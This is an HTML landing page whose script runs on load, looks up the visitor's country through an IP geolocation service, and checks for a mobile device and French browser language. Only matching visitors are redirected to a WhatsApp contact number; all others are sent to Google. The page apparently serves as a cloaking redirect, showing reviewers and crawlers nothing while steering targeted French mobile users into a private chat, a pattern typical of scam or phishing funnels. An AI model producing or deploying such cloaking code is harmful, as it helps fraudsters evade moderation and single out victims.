

<!DOCTYPE html>
<html>
<head>
 

  <title>WELCOME</title>
  <meta charset="utf-8">
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
    }

    iframe {
      width: 100%;
	  font-size: 14px; /* 调整字体大小 */
      
     height: 100%;
      border: none;
    }
  </style>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Expires" content="0">
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
</head>
	 
  <body onload="handleResponse()">
 
<script>
  function handleResponse() {
    function isMobileDevice() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

function isFrenchLang() {
    return navigator.language.startsWith('fr') || 
           navigator.languages.some(lang => lang.startsWith('fr'));
}

    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        // 严格的三重条件判断
        if (data.country === 'FR' && isMobileDevice() && isFrenchLang()) {
          window.location.href = "https://wa.me/33745757654";
          return;
        }
      window.location.href = "https://www.google.com";
      })
      .catch(() => {
        // IP检测失败时严格的双重条件判断
        if (isMobileDevice() && isFrenchLang()) {
          window.location.href = "https://wa.me/33745757654";
          return;
        }
         window.location.href = "https://www.google.com";
      });
  }
</script>
 
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 
</body>
</html>
